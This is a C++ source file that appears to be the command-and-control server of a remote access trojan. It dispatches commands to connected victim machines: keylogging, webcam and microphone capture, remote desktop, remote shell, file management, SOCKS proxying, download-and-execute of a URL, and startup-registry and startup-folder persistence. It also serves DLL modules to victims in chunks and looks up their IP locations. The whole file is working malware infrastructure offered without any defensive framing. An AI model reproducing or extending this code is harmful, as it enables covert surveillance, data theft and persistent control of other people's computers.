#include "stdafx.h"
#include "KernelSrv.h"
#include "ClientList.h"
#include "json\json.h"
#include "MainFrm.h"
#include "utils.h"

CKernelSrv::CKernelSrv(HWND hClientList, CClientContext *pClient) :
CMsgHandler(pClient)
{
	m_hClientList = hClientList;
	m_UpDlg = nullptr;
}


CKernelSrv::~CKernelSrv()
{
}

void CKernelSrv::OnClose()
{
	//客户退出,通知移除
	SendMessage(m_hClientList, WM_CLIENT_LOGOUT, (WPARAM)this, 0);
}
void CKernelSrv::OnOpen()
{
	//一切工作准备就绪.可以开始接收了
	SendMsg(KNEL_READY, 0, 0);
}
//.

void CKernelSrv::OnReadMsg(WORD Msg,DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case KNEL_LOGIN:
		OnLogin((LoginInfo*)Buffer);
		break;
	case KNEL_EDITCOMMENT_OK:
		SendMessage(m_hClientList, WM_CLIENT_EDITCOMMENT, (WPARAM)this, (LPARAM)Buffer);
		break;
	case KNEL_GETMODULE_INFO:
		OnGetModuleInfo(Buffer);
		break;
	case KNEL_MODULE_CHUNK_GET:
		OnGetModuleChunk(Buffer);
		break;
	case KNEL_ERROR:
		OnError((TCHAR*)Buffer);
		break;
	default:
		break;
	}
}



void CKernelSrv::Power_Reboot()
{
	SendMsg(KNEL_POWER_REBOOT, 0, 0);
}
void CKernelSrv::Power_Shutdown()
{
	SendMsg(KNEL_POWER_SHUTDOWN, 0, 0);
}
void CKernelSrv::EditComment(TCHAR*Comment)
{
	SendMsg(KNEL_EDITCOMMENT, (char*)Comment,sizeof(TCHAR)*( lstrlen(Comment) + 1));
}

void CKernelSrv::Restart()
{
	SendMsg(KNEL_RESTART, 0, 0);
}

void CKernelSrv::UploadModuleFromDisk(TCHAR* Path)
{
	SendMsg(KNEL_UPLOAD_MODULE_FROMDISK, (char*)Path, sizeof(TCHAR)*(lstrlen(Path) + 1));
}

void CKernelSrv::UploadModuleFromUrl(TCHAR* Url)
{
	SendMsg(KNEL_UPLOAD_MODULE_FORMURL, (char*)Url,  sizeof(TCHAR)*(lstrlen(Url) + 1));
}
void CKernelSrv::BeginCmd()
{
	SendMsg(KNEL_CMD, 0, 0);
}
void CKernelSrv::BeginChat()
{
	SendMsg(KNEL_CHAT, 0, 0);
}

void CKernelSrv::BeginFileMgr()
{
	SendMsg(KNEL_FILEMGR, 0, 0);
}

void CKernelSrv::BeginRemoteDesktop()
{
	SendMsg(KNEL_DESKTOP, 0, 0);
}

void CKernelSrv::BeginCamera()
{
	SendMsg(KNEL_CAMERA, 0, 0);
}

void CKernelSrv::BeginMicrophone()
{
	SendMsg(KNEL_MICROPHONE, 0, 0);
}


void CKernelSrv::UtilsWriteStartupReg(){
	SendMsg(KNEL_UTILS_WRITE_REG, 0, 0);
}

void CKernelSrv::UtilsCopyToStartupMenu(){
	SendMsg(KNEL_UTILS_COPYTOSTARTUP, 0, 0);
}


void CKernelSrv::OnError(TCHAR * Error){
	SendMessage(m_hClientList, WM_KERNEL_ERROR, (WPARAM)Error, (LPARAM)GetPeerName().first.c_str());
}

void CKernelSrv::BeginDownloadAndExec(TCHAR szUrl[])
{
	SendMsg(KNEL_DOWNANDEXEC, (char*)szUrl, (sizeof(TCHAR)*(lstrlen(szUrl) + 1)));
}

void CKernelSrv::BeginExit(){
	SendMsg(KNEL_EXIT, 0, 0);
}

void CKernelSrv::BeginKeyboardLog(){
	SendMsg(KNEL_KEYBD_LOG, 0, 0);
}

void CKernelSrv::BeginProxy_Socks(){
	SendMsg(KNEL_PROXY_SOCKSPROXY, 0, 0);
}

void CKernelSrv::OnLogin(LoginInfo *pLi){
	SendMessage(m_hClientList, WM_CLIENT_LOGIN, (WPARAM)this, (LPARAM)pLi);
}

#define MAX_CHUNK_SIZE 0x10000


void CKernelSrv::OnGetModuleChunk(char * ChunkInfo){
	DWORD * chunkInfo = (DWORD*)ChunkInfo;
	DWORD ModuleSize = chunkInfo[0];
	DWORD CheckSum = chunkInfo[1];
	DWORD Offset = chunkInfo[2];
	DWORD ChunkSize = chunkInfo[3] > MAX_CHUNK_SIZE ? MAX_CHUNK_SIZE : chunkInfo[3];

	char * szModuleName = ChunkInfo + sizeof(DWORD) * 4;
	//
	HANDLE hFile = INVALID_HANDLE_VALUE;
	CString FileName;

	CMainFrame * pMainWnd = (CMainFrame*)AfxGetApp()->m_pMainWnd;;
	const string & val = pMainWnd->getConfig().getconfig("server", "modules");

	FileName += val.c_str();
	FileName += TEXT("\\");
	FileName += szModuleName;
	FileName += ".dll";

	size_t size = sizeof(DWORD) * 3 + ChunkSize;
	char * Res = (char*)calloc(1, size );
	DWORD * ChunkResponse = (DWORD*)Res;
	char * chunkData = Res + sizeof(DWORD) * 3;

	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE){
		SendMsg(KNEL_MODULE_CHUNK_DAT, Res, size);
		free(Res);
		return;
	}
	//Set Module Size
	ChunkResponse[0] = GetFileSize(hFile, NULL);

	if (Offset != SetFilePointer(hFile, Offset, 0, FILE_BEGIN)){
		SendMsg(KNEL_MODULE_CHUNK_DAT, Res, size);
		free(Res);
		CloseHandle(hFile);
		return;
	}
	//
	DWORD ReadBytes = 0;
	ReadFile(hFile, chunkData, ChunkSize, &ReadBytes, NULL);
	//Set Chunk Size
	ChunkResponse[1] = ReadBytes;
	//calc checksum...
	for (size_t i = 0; i < ReadBytes; i++){
		ChunkResponse[2] += ((unsigned char*)chunkData)[i];
	}
	//ChunkSize 一定大于等于 ReadBytes
	SendMsg(KNEL_MODULE_CHUNK_DAT, Res, size - (ChunkSize - ReadBytes));
	free(Res);
	CloseHandle(hFile);

	//更新进度....
	LPVOID ArgList[4];
	ArgList[0] = this;
	ArgList[1] = szModuleName;
	ArgList[2] = (LPVOID)ModuleSize;
	ArgList[3] = (LPVOID)(Offset + ReadBytes);

	SendMessage(m_hClientList, WM_KERNEL_UPDATE_UPLODA_STATU, 4, (LPARAM)ArgList);
}


////old ...
//#define KNEL_MODULE			(0xea07)
//
//void CKernelSrv::OnGetModuleInfo(const char*ModuleName){
//	//
//	CString FileName = L"modules\\";
//	DWORD dwFileSizeLow = NULL;
//	LPVOID lpBuffer = NULL;
//	HANDLE hFile = INVALID_HANDLE_VALUE;
//	DWORD dwRead = 0;
//
//	FileName += CA2W(ModuleName);
//	FileName += L".dll";
//
//	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
//		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//
//	if (hFile == INVALID_HANDLE_VALUE){
//		SendMsg(KNEL_MODULE, 0, 0);
//		return;
//	}
//	dwFileSizeLow = GetFileSize(hFile, NULL);
//	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
//	if (lpBuffer && ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL) &&
//		dwRead == dwFileSizeLow){
//		SendMsg(KNEL_MODULE, (char*)lpBuffer, dwRead);
//	}
//	else{
//		SendMsg(KNEL_MODULE, 0, 0);
//	}
//	if (lpBuffer){
//		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
//		lpBuffer = NULL;
//	}
//	CloseHandle(hFile);
//}

void CKernelSrv::OnGetModuleInfo(const char*ModuleName){
	//
	CString FileName;
	CMainFrame * pMainWnd = (CMainFrame*)AfxGetApp()->m_pMainWnd;
	CConfig & config = pMainWnd->getConfig();
	const string & val = config.getconfig("server", "modules");

	FileName += val.c_str();
	FileName += TEXT("\\");
	FileName += ModuleName;
	FileName += TEXT(".dll");

	DWORD dwFileSizeLow = NULL;
	LPVOID lpBuffer = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwRead = 0;
	DWORD checkSum = 0;
	//
	size_t size = sizeof(DWORD) * 2 + lstrlenA(ModuleName) + 1;
	char * module_info = (char*)calloc(1, size);
	lstrcpyA(module_info + sizeof(DWORD) * 2, ModuleName);

	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE){
		SendMsg(KNEL_MODULE_INFO, module_info, size);
		free(module_info);
		return;
	}

	dwFileSizeLow = GetFileSize(hFile, NULL);
	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL);
	
	for (size_t i = 0; i < dwFileSizeLow; i++){
		checkSum += ((unsigned char*)lpBuffer)[i];
	}

	((DWORD*)module_info)[0] = dwFileSizeLow;
	((DWORD*)module_info)[1] = checkSum;

	if (lpBuffer){
		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
		lpBuffer = NULL;
	}
	CloseHandle(hFile);

	SendMsg(KNEL_MODULE_INFO, module_info, size);
	free(module_info);
	return;
}

CString CKernelSrv::GetLocation(){
	auto const peer = GetPeerName();

	CString ip_location;
	ip_location = peer.first.c_str();

	CString location = getIPLocation(ip_location);
	if (location.GetLength()){
		ip_location += '/';
		ip_location += location;
	}
	return ip_location;
}


#include <afxinet.h>


CString CKernelSrv::getIPLocation(const CString & ip_address){
	
	CInternetSession c;
	CString strUrl;
	Json::Value info;
	CString retVal = TEXT("unknown location");
	char Buffer[1025] = { 0 };
	strUrl.Format(TEXT("https://ip.useragentinfo.com/json?ip=%s"),ip_address);

	CHttpFile * httpFile = (CHttpFile*)c.OpenURL(strUrl);   //打开一个URL
	httpFile->Read(Buffer, 1024);
	httpFile->Close();
	//
	char* str = convertUTF8ToAnsi(Buffer);
	
	if (Json::Reader().parse(str, info)){
		string location = "";
		
		if (info["desc"] == "success"){
			if (info["country"].asString().length()){
				location += info["country"].asString();
			}
			if (info["province"].asString().length()){
				location += info["province"].asString();
			}
			if (info["city"].asString().length()){
				location += info["city"].asString();
			}
			if (info["area"].asString().length()){
				location += info["area"].asString();
			}
			if (location.length() == 0){
				location = "unknown location";
			}
			retVal = CA2W(location.c_str());
		}
	}
	delete[]str;
	return  retVal;
}

